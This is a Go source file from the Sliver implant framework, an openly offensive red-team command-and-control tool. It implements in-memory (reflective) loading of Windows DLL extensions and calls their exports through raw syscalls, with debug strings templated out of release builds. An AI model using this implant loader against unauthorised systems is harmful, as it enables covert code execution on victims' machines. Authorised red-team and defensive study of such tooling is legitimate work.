package extension

/*
	Sliver Implant Framework
	Copyright (C) 2021  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"errors"
	"sync"
	"syscall"
	"unsafe"

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"github.com/moloch--/memmod"
)

const (
	Success = 0
	Failure = 1
)

type WindowsExtension struct {
	id     string
	data   []byte
	module *memmod.Module
	arch   string
	init   string
	sync.Mutex
}

// NewWindowsExtension - Load a new windows extension
func NewWindowsExtension(data []byte, id string, arch string, init string) *WindowsExtension {
	return &WindowsExtension{
		id:   id,
		data: data,
		arch: arch,
		init: init,
	}
}

// GetID - Get the extension ID
func (w *WindowsExtension) GetID() string {
	return w.id
}

// GetArch - Get the extension architecture
func (w *WindowsExtension) GetArch() string {
	return w.arch
}

// Load - Load the extension into memory
func (w *WindowsExtension) Load() error {
	var err error
	if len(w.data) == 0 {
		return errors.New("{{if .Config.Debug}} extension data is empty {{end}}")
	}
	w.Lock()
	defer w.Unlock()
	w.module, err = memmod.LoadLibrary(w.data)
	if err != nil {
		return err
	}
	if w.init != "" {
		initProc, errInit := w.module.ProcAddressByName(w.init)
		if errInit == nil {
			// {{if .Config.Debug}}
			log.Printf("Calling %s\n", w.init)
			// {{end}}
			syscall.Syscall(initProc, 0, 0, 0, 0)
		} else {
			return errInit
		}
	}
	return nil
}

// Call - Call an extension export
func (w *WindowsExtension) Call(export string, arguments []byte, onFinish func([]byte)) error {
	var (
		argumentsPtr  uintptr
		argumentsSize uintptr
	)
	if w.module == nil {
		return errors.New("{{if .Config.Debug}} module not loaded {{end}}")
	}
	callback := syscall.NewCallback(newWindowsExtensionCallback(onFinish))
	exportPtr, err := w.module.ProcAddressByName(export)
	if err != nil {
		return err
	}
	if len(arguments) > 0 {
		argumentsPtr = uintptr(unsafe.Pointer(&arguments[0]))
		argumentsSize = uintptr(uint32(len(arguments)))
	}
	// {{if .Config.Debug}}
	log.Printf("Calling %s, arguments addr: 0x%08x, args size: %08x\n", export, argumentsPtr, argumentsSize)
	// {{end}}
	// The extension API must respect the following prototype:
	// int Run(buffer char*, bufferSize uint32_t, goCallback callback)
	// where goCallback = int(char *, int)
	w.Lock()
	defer w.Unlock()
	_, _, errNo := syscall.Syscall(exportPtr, 3, argumentsPtr, argumentsSize, callback)
	if errNo != 0 {
		return errors.New(errNo.Error())
	}

	return nil
}

func newWindowsExtensionCallback(onFinish func([]byte)) func(data uintptr, dataLen uintptr) uintptr {
	// extensionCallback takes a buffer (char *) and its size (int) as parameters
	// so we can pass data back to the Go process from the loaded DLL
	return func(data uintptr, dataLen uintptr) uintptr {
		outDataSize := int(dataLen)
		outBytes := unsafe.Slice((*byte)(unsafe.Pointer(data)), outDataSize)
		if dataLen > 0 {
			onFinish(outBytes)
		}
		return Success
	}
}
